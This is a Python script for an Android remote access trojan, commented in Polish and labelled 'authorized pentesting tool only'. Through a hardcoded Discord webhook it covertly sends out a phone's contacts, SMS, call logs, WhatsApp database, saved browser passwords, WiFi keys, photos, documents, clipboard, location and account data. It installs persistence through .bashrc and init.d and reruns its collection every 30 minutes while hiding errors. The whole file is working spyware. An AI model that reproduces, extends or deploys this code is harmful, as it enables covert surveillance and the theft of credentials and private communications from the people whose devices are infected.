#!/usr/bin/env python3
"""
Android RAT - Discord Webhook Exfiltration
Authorized pentesting tool only
"""
import os
import sys
import json
import time
import sqlite3
import shutil
import tempfile
import subprocess
import requests
import glob
import re
from datetime import datetime

WEBHOOK_URL = "https://discord.com/api/webhooks/1509286003586633929/J1B7qGfkiV7c1KRSZli3nB-Ua6ydFfR2d1GpShtTBEml2NaRT2UfBGKBbLaVXgwhqbHF"

def send_discord(content, filename=None):
    """Wyślij do Discorda z podziałem na fragmenty"""
    try:
        if filename and os.path.exists(filename):
            with open(filename, 'rb') as f:
                files = {'file': (os.path.basename(filename), f)}
                requests.post(WEBHOOK_URL, data={'content': content[:1000]}, files=files, timeout=10)
        else:
            chunks = [content[i:i+1900] for i in range(0, len(content), 1900)]
            for chunk in chunks:
                requests.post(WEBHOOK_URL, data={'content': chunk}, timeout=10)
                time.sleep(0.5)
    except Exception as e:
        pass  # Cicha obsługa błędu

def is_root():
    """Sprawdź czy mamy root"""
    return os.system("id | grep -q uid=0") == 0

def get_device_info():
    """Podstawowe info o urządzeniu"""
    info = {}
    # Build properties
    for line in subprocess.getoutput("getprop").split('\n'):
        if '[' in line and ']' in line:
            try:
                k = line.split('[')[1].split(']')[0]
                v = line.split('[')[2].split(']')[0]
                info[k] = v
            except:
                pass
    
    msg = f"**Nowe urządzenie zaatakowane!**\n"
    msg += f"```\n"
    msg += f"Model: {info.get('ro.product.model', 'N/A')}\n"
    msg += f"Producent: {info.get('ro.product.manufacturer', 'N/A')}\n"
    msg += f"Android: {info.get('ro.build.version.release', 'N/A')}\n"
    msg += f"SDK: {info.get('ro.build.version.sdk', 'N/A')}\n"
    msg += f"Hostname: {subprocess.getoutput('hostname')}\n"
    msg += f"IP: {subprocess.getoutput('ip a show wlan0 2>/dev/null | grep inet | head -1')}\n"
    msg += f"Root: {is_root()}\n"
    msg += f"Bateria: {subprocess.getoutput('dumpsys battery | grep level')}\n"
    msg += f"```"
    return msg

def get_contacts():
    """Pobierz kontakty z bazy Android"""
    contacts = []
    paths = [
        "/data/data/com.android.providers.contacts/databases/contacts2.db",
        "/data/data/com.android.contacts/databases/contacts2.db",
        "/storage/emulated/0/Android/data/com.android.providers.contacts/databases/contacts2.db"
    ]
    
    for path in paths:
        if os.path.exists(path):
            try:
                tmp = tempfile.mktemp()
                shutil.copy2(path, tmp)
                conn = sqlite3.connect(tmp)
                c = conn.cursor()
                # Pobierz kontakty
                try:
                    c.execute("SELECT display_name, data1 FROM view_data WHERE data1 IS NOT NULL AND display_name IS NOT NULL LIMIT 100")
                    contacts = c.fetchall()
                except:
                    c.execute("SELECT display_name, number FROM contacts LIMIT 100")
                    contacts = c.fetchall()
                conn.close()
                os.remove(tmp)
                break
            except:
                pass
    
    if contacts:
        msg = f"**Kontakty ({len(contacts)}):**\n```\n"
        for name, num in contacts[:50]:
            msg += f"{name}: {num}\n"
        msg += "```"
        send_discord(msg)

def get_sms():
    """Pobierz SMS-y"""
    paths = [
        "/data/data/com.android.providers.telephony/databases/mmssms.db",
        "/storage/emulated/0/Android/data/com.android.providers.telephony/databases/mmssms.db"
    ]
    
    for path in paths:
        if os.path.exists(path):
            try:
                tmp = tempfile.mktemp()
                shutil.copy2(path, tmp)
                conn = sqlite3.connect(tmp)
                c = conn.cursor()
                c.execute("SELECT address, body, date FROM sms ORDER BY date DESC LIMIT 50")
                sms = c.fetchall()
                conn.close()
                os.remove(tmp)
                
                if sms:
                    msg = f"**SMS (ostatnie {len(sms)}):**\n```\n"
                    for addr, body, date in sms:
                        dt = datetime.fromtimestamp(int(date)/1000).strftime('%Y-%m-%d %H:%M')
                        msg += f"[{dt}] {addr}: {body[:100]}\n"
                    msg += "```"
                    send_discord(msg)
                break
            except:
                pass

def get_call_log():
    """Pobierz logi połączeń"""
    paths = [
        "/data/data/com.android.providers.contacts/databases/calllog.db",
        "/data/data/com.android.dialer/databases/calllog.db"
    ]
    
    for path in paths:
        if os.path.exists(path):
            try:
                tmp = tempfile.mktemp()
                shutil.copy2(path, tmp)
                conn = sqlite3.connect(tmp)
                c = conn.cursor()
                c.execute("SELECT number, date, duration, type FROM calls ORDER BY date DESC LIMIT 30")
                calls = c.fetchall()
                conn.close()
                os.remove(tmp)
                
                if calls:
                    msg = f"**Logi połączeń:**\n```\n"
                    types = {1: "Przychodzące", 2: "Wychodzące", 3: "Nieodebrane"}
                    for num, date, dur, tp in calls:
                        dt = datetime.fromtimestamp(int(date)/1000).strftime('%Y-%m-%d %H:%M')
                        t = types.get(tp, f"Typ{tp}")
                        msg += f"[{dt}] {t} - {num} ({dur}s)\n"
                    msg += "```"
                    send_discord(msg)
                break
            except:
                pass

def get_whatsapp():
    """Pobierz bazę WhatsApp"""
    paths = glob.glob("/data/data/com.whatsapp/databases/msgstore.db*")
    if not paths:
        paths = glob.glob("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases/msgstore.db*")
    
    if paths:
        try:
            # Wyślij plik bazy jako załącznik
            send_discord(f"**WhatsApp DB znaleziony:** {paths[0]}", paths[0])
        except:
            pass

def get_browser_data():
    """Dane z przeglądarek"""
    browsers = [
        ("Chrome", "/data/data/com.android.chrome/app_chrome/Default/Login Data"),
        ("Chrome WebView", "/data/data/com.google.android.webview/app_webview/Default/Login Data"),
        ("Firefox", "/data/data/org.mozilla.firefox/files/mozilla/*.default/logins.json"),
        ("Opera", "/data/data/com.opera.browser/app_opera/Default/Login Data"),
        ("Samsung Internet", "/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default/Login Data")
    ]
    
    for name, path in browsers:
        if '*' in path:
            files = glob.glob(path)
        else:
            files = [path] if os.path.exists(path) else []
        
        for p in files:
            try:
                tmp = tempfile.mktemp()
                shutil.copy2(p, tmp)
                
                if p.endswith('.db') or 'Login Data' in p:
                    conn = sqlite3.connect(tmp)
                    c = conn.cursor()
                    c.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 20")
                    logins = c.fetchall()
                    conn.close()
                    
                    if logins:
                        msg = f"**{name} - Loginy:**\n```\n"
                        for url, user, pwd in logins:
                            if user:
                                msg += f"URL: {url}\nUser: {user}\nPass: {pwd}\n---\n"
                        msg += "```"
                        send_discord(msg)
                
                os.remove(tmp)
            except:
                pass

def get_wifi_passwords():
    """Pobierz hasła WiFi (wymaga root)"""
    if not is_root():
        return
    
    wifi_path = "/data/misc/wifi/wpa_supplicant.conf"
    if os.path.exists(wifi_path):
        try:
            with open(wifi_path, 'r') as f:
                content = f.read()
            networks = re.findall(r'ssid="([^"]+)".*?psk="([^"]+)"', content, re.DOTALL)
            if networks:
                msg = f"**Hasła WiFi:**\n```\n"
                for ssid, psk in networks:
                    msg += f"SSID: {ssid} | Pass: {psk}\n"
                msg += "```"
                send_discord(msg)
        except:
            pass
    
    # Android 10+ zapisuje w inny sposób
    api_paths = glob.glob("/data/misc/wifi/WifiConfigStore*.xml")
    for ap in api_paths:
        try:
            send_discord(f"WiFi config: {ap}", ap)
        except:
            pass

def get_files():
    """Zbierz interesujące pliki"""
    targets = [
        ("DCIM/Camera", ['.jpg', '.png', '.mp4']),
        ("Documents", ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.txt']),
        ("Download", ['.apk', '.zip', '.rar', '.pdf']),
        ("WhatsApp/Media/WhatsApp Images", ['.jpg', '.png']),
    ]
    
    base = "/storage/emulated/0"
    collected = []
    
    for folder, exts in targets:
        path = os.path.join(base, folder)
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for f in files[:10]:  # Limit 10 na folder
                    if any(f.lower().endswith(e) for e in exts):
                        fpath = os.path.join(root, f)
                        if os.path.getsize(fpath) < 5 * 1024 * 1024:  # <5MB
                            collected.append(fpath)
    
    if collected:
        msg = f"**Znalezione pliki ({len(collected)}):**\n```\n"
        for f in collected[:20]:
            msg += f"{f}\n"
        msg += "```"
        send_discord(msg)
        
        # Wyślij pierwsze 3 jako załączniki
        for f in collected[:3]:
            try:
                send_discord(f"File: {os.path.basename(f)}", f)
            except:
                pass

def get_clipboard():
    """Pobierz schowek (wymaga root lub Accessibility Service)"""
    if is_root():
        try:
            result = subprocess.getoutput("su -c 'content read --uri content://clipboard' 2>/dev/null")
            if result:
                send_discord(f"**Schowek:**\n```\n{result[:500]}\n```")
        except:
            pass

def get_location():
    """Pobierz ostatnią lokalizację"""
    if is_root():
        try:
            cmd = "su -c 'dumpsys location | grep -A 5 \"Last Known Location\"'"
            loc = subprocess.getoutput(cmd)
            if loc:
                send_discord(f"**Lokalizacja:**\n```\n{loc[:500]}\n```")
        except:
            pass

def get_accounts():
    """Pobierz konta Google i inne"""
    if is_root():
        try:
            result = subprocess.getoutput("su -c 'pm list accounts' 2>/dev/null")
            if result:
                send_discord(f"**Konta:**\n```\n{result}\n```")
        except:
            pass
        
        # Tokeny Google
        try:
            result = subprocess.getoutput("su -c 'cat /data/system/accounts.db 2>/dev/null | strings | grep -i gmail | head -20'")
            if result:
                send_discord(f"**Konta Google (raw):**\n```\n{result}\n```")
        except:
            pass

def persist():
    """Mechanizm persistencji"""
    # Dla Termux - dodanie do .bashrc
    script_path = os.path.abspath(__file__)
    bashrc = os.path.expanduser("~/.bashrc")
    
    try:
        with open(bashrc, 'r') as f:
            content = f.read()
        if script_path not in content:
            with open(bashrc, 'a') as f:
                f.write(f"\npython3 {script_path} --background &\n")
    except:
        pass
    
    # Dla root - init.d
    if is_root():
        init_script = f"""#!/system/bin/sh
python3 {script_path} --background &
"""
        try:
            with open("/data/local/tmp/rat.sh", 'w') as f:
                f.write(init_script)
            os.system("chmod +x /data/local/tmp/rat.sh")
            os.system("su -c 'cp /data/local/tmp/rat.sh /system/etc/init.d/99rat 2>/dev/null'")
        except:
            pass

def main():
    # Sprawdź czy uruchomiony z --background - wtedy cichy tryb
    background = '--background' in sys.argv
    
    if not background:
        send_discord(get_device_info())
    
    # Zbieranie danych
    get_contacts()
    get_sms()
    get_call_log()
    get_whatsapp()
    get_browser_data()
    get_wifi_passwords()
    get_files()
    get_clipboard()
    get_location()
    get_accounts()
    
    if not background:
        send_discord("[+] Pierwsze zbieranie danych zakończone")
    
    # Persistencja
    persist()
    
    # Pętla - zbieraj co 30 minut
    if background:
        while True:
            time.sleep(1800)  # 30 minut
            get_sms()
            get_call_log()
            get_clipboard()
            get_location()

if __name__ == "__main__":
    main()
